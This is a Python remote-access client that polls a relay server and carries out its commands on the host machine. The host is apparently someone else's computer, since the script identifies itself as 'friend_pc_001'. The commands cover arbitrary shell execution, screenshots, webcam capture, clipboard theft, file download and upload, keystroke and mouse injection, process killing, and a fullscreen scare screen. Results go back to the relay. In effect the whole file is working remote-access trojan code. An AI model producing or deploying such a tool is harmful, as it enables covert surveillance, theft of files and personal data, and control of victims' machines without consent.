import requests
import json
import subprocess
import socket
import platform
import psutil
import base64
import io
import time
import sys
from datetime import datetime

RELAY_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
CLIENT_ID = "friend_pc_001"
CONTROLLER_ID = "controller_001"

def handle_command(command):
    try:
        if command["type"] == "shell":
            result = subprocess.run(command["cmd"], shell=True, capture_output=True, text=True, timeout=30)
            return {"type": "result", "output": result.stdout + result.stderr, "code": result.returncode}

        elif command["type"] == "screenshot":
            import pyautogui
            from PIL import Image
            img = pyautogui.screenshot()
            buffered = io.BytesIO()
            img.save(buffered, format="PNG")
            img_data = base64.b64encode(buffered.getvalue()).decode()
            return {"type": "screenshot", "data": img_data}

        elif command["type"] == "ping":
            return {"type": "pong", "hostname": socket.gethostname()}

        elif command["type"] == "sysinfo":
            info = {
                "system": platform.system(),
                "node": platform.node(),
                "release": platform.release(),
                "version": platform.version(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "cpu_count": psutil.cpu_count(),
                "memory": psutil.virtual_memory()._asdict(),
                "disk": {p.device: psutil.disk_usage(p.mountpoint)._asdict() for p in psutil.disk_partitions() if os.path.exists(p.mountpoint)}
            }
            return {"type": "sysinfo", "data": info}

        elif command["type"] == "ps":
            procs = []
            for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    procs.append(p.info)
                except:
                    pass
            return {"type": "ps", "data": procs[:50]}

        elif command["type"] == "kill":
            pid = command.get("pid")
            psutil.Process(pid).terminate()
            return {"type": "result", "output": f"Process {pid} terminated"}

        elif command["type"] == "ls":
            path = command.get("path", ".")
            files = os.listdir(path)
            file_info = [{"name": f, "is_dir": os.path.isdir(os.path.join(path, f)), "size": os.path.getsize(os.path.join(path, f)) if os.path.isfile(os.path.join(path, f)) else 0} for f in files]
            return {"type": "ls", "data": file_info, "path": path}

        elif command["type"] == "get_file":
            filepath = command["path"]
            with open(filepath, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            return {"type": "file_data", "data": data, "name": os.path.basename(filepath)}

        elif command["type"] == "put_file":
            filepath = command["path"]
            data = base64.b64decode(command["data"])
            with open(filepath, "wb") as f:
                f.write(data)
            return {"type": "result", "output": f"File saved to {filepath}"}

        elif command["type"] == "clipboard_get":
            import pyperclip
            return {"type": "clipboard", "data": pyperclip.paste()}

        elif command["type"] == "clipboard_set":
            import pyperclip
            pyperclip.copy(command["data"])
            return {"type": "result", "output": "Clipboard updated"}

        elif command["type"] == "type_text":
            import pyautogui
            pyautogui.typewrite(command["text"])
            return {"type": "result", "output": "Text typed"}

        elif command["type"] == "mouse_click":
            import pyautogui
            x, y = command.get("x", 0), command.get("y", 0)
            if x and y:
                pyautogui.click(x, y)
            else:
                pyautogui.click()
            return {"type": "result", "output": "Mouse clicked"}

        elif command["type"] == "lock":
            if platform.system() == "Windows":
                subprocess.run("rundll32.exe user32.dll,LockWorkStation")
            elif platform.system() == "Linux":
                subprocess.run("loginctl lock-session")
            return {"type": "result", "output": "Screen locked"}

        elif command["type"] == "webcam":
            import cv2
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            cap.release()
            if ret:
                _, buffer = cv2.imencode('.png', frame)
                img_data = base64.b64encode(buffer).decode()
                return {"type": "webcam", "data": img_data}
            return {"type": "error", "message": "Failed to capture webcam"}

        elif command["type"] == "echo":
            return {"type": "echo", "message": command.get("message", "")}

        elif command["type"] == "panic":
            import threading
            import tkinter as tk
            def show_panic():
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.overrideredirect(True)
                root.configure(bg='black')
                art = """..........................................................%
.  %%%%%%%%%%%%%%%%%@%.              +@%%%%%%%%%%%%%%%%=  %
.  %%%%%%%%%%%%#..                        ..%%%%%%%%%%%=  %
.  %%%%%%%%@.                                  +%%%%%%%=  %
.  %%%%%%.                                       .%%%%%=  %
.  %%%%.                                           .%%%=  %
.  %%                                                .%=  %
.  %.                                                 .=  %
.  .                                                      %
.                                                         %
.  %%%.                                             .%%.  %
.  %%%%.  ..%%%%%%%%%%.             .%%%%%%%%%%..  .%%%.  %
.  ..%%%.%%%%.   %%%%%%%:.       .#%%%%%%%   .@%%%..%...  %
.  %%%%@:%.       .:%%%%%%%@   %%%%%%%%..      ..%.%%%%.  %
.  ...%%.            .%%%%%%   %%%%%%.            .%%+.   %
.  %%%.  .%.            %%%.   .%%#            %%   .@%.  %
.  .    .%.   .%%%%%%%.            .=%%%%%%+.   %%     .  %
.       .%.  .%%%%%%%%%%   %   %  .%%%%%%%%%%.  -%.       %
.        ..  @%%%%%%%%%%.  %  .%. .%%%%%%%%%%.  @.        %
.         .%%       .%@.  .%   %%  .%%.      .%%.         %
.                      . #%.   .%%..                      %
.       .%%            +%.        =@.           %@.       %
.      %%%.            %           %:           .%%%      %
.    .%%%%            .=..       ....           .%%%@.    %
.    %%%%%.       .+%%%%%%%    .%%%%%%%+.      .%%%%%%    %
.   .%%%%%%%@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%    %
.    %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%    %
.  %.*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% .=  %
.  %%.+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% .%=  %
.  %%%= .%%%%%%%%%%%%%%%%%%%%%%%%%%@%%%%%%%%%%%%%+. #%%=  %
.  %%%%-      ... %%%%%%%%:.   .:%%%%%%%%..        :%%%=  %
.  %%%%%.           %%%%%%%%%%%%%%%%%%%.          .%%%%=  %
.  %%%%%%            .%%%%%%%%%%%%%%%.            %%%%%=  %
.  %%%%%%               ..:%%@%+..                %%%%%=  %
.  %%%%%%                                        .%%%%%=  %
.  %%%%%%%.                                     .%%%%%%=  %
.  %%%%%%%%                                    .%%%%%%%=  %
.  %%%%%%%%%                                   %%%%%%%%=  %
.  %%%%%%%%%%%                               #%%%%%%%%%=  %
.  %%%%%%%%%%%%:                           #%%%%%%%%%%%=  %
.  %%%%%%%%%%%%%%:                       %%%%%%%%%%%%%%=  %
.  %%%%%%%%%%%%%%%%.                   .%%%%%%%%%%%%%%%=  %
...%%%%%%%%%%%%%%%%%......%%%%%@.......%%%%%%%%%%%%%%%%=..%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%. .%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%. %%%%%%%%%%%@%@%%%%%%%%%%%%%%%%%%%%%%%%. %%%%%%%@%@%%%
%%%%. ::#%  @%%%# .% .%. %..%%%: :%%% .% .%%. @%%%..%. %%%%
%%%%. %%%%%   .%# .% .%. %%%%%%: :%%%    .%%. %%%% .%. %%%%
%%%%. %%%%..% .%#... .%... ..%.   .%%. ..%%%. ..%%. . .%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% .=%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.  .%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% """
                lbl = tk.Label(root, text=art, bg='black', fg='white', font=('Courier', 8), justify='left')
                lbl.pack(expand=True, fill='both')
                root.bind('<Escape>', lambda e: root.destroy())
                root.mainloop()
            threading.Thread(target=show_panic, daemon=True).start()
            return {"type": "result", "output": "Panic mode activated"}

    except Exception as e:
        return {"type": "error", "message": str(e)}

def poll_messages():
    try:
        resp = requests.get(f"{RELAY_URL}/{CLIENT_ID}", timeout=5)
        if resp.status_code == 200:
            command = resp.json()
            print(f"[*] Received: {command.get('type')}")
            response = handle_command(command)
            response["to"] = command.get("from")
            response["from"] = CLIENT_ID
            requests.post(RELAY_URL, json=response, timeout=5)
    except:
        pass

def main():
    print(f"[*] Connecting to relay: {RELAY_URL}")
    print(f"[*] Registered as: {CLIENT_ID}")
    while True:
        poll_messages()
        time.sleep(1)

if __name__ == "__main__":
    main()
